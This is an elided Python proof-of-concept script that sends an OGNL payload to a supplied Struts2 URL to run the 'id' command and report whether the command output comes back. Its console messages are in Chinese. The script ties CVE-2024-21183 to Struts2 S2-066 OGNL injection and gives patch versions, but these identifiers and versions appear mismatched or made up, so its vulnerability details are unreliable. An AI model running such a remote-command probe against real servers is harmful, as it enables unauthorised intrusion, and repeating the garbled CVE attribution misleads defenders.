...
def poc(url):
    """
    PoC for CVE-2024-21183 (Struts2 S2-066): OGNL Expression Injection RCE
    ...
    try:
        ...
        # OGNL payload for CVE-2024-21183 to execute 'id' command
        payload = (
        ...
        print(f"[*] 测试 CVE-2024-21183 漏洞: {url}")
        ...
        if response.status_code == 200 and "uid=" in response.text:
            print(f"[+] [{url}] 可能存在 CVE-2024-21183 漏洞！")
            print(f"[+] 响应包含命令输出: {response.text[:100]}...")
            return True
        else:
            print(f"[-] [{url}] 未检测到 CVE-2024-21183 漏洞（状态码: {response.status_code}）")
            return False
...
def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2024-21183 (Struts2 S2-066 RCE)")
    parser.add_argument("--url", required=True, help="目标 Struts2 应用 URL（例如 http://example.com:8080）")
    args = parser.parse_args()

    result = poc(args.url)
    if result:
        print(f"[*] 建议升级 Apache Struts2 到 2.3.38、2.5.34、6.4.1 或更高版本。")
        print(f"[*] 参考: https://avd.aliyun.com/detail?id=AVD-2024-21183")
